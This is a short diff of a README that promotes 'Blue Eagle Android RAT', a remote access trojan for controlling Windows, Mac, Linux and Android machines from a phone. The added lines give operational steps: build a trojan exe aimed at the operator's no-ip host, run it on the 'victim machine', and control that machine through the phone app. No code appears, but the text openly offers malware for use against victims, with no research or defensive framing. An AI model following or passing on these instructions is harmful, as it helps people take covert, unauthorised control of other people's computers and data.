@@ -2,7 +2,9 @@
 # Blue Eagle Android RAT for Android
 Hacking Wnidows / MAC / Linux / Adnroid  using your Android Phone
 😲😎💪TCP Server RAT [Remote Access Trojan] Preview : 
-# download , host is your no-ip / portforward your android phone to the RAT 😎😎 install apk , start app , and listen to the port💪   
+# download Android RAT exe-apk Builder_Win8.exe 
+# Build the apk Server one time only , build trojan exe for your android local ip / no-ip
+# the host is your no-ip / portforward your android phone to the RAT 😎😎 install apk , start app , and listen to the port💪   
 # build exe if for exe trojan , build apk [ generally the same one every time ]
 # run exe on victim machine , run apk on phone to control victim machine , to refresh list , wipe the list view
 <p align="center">
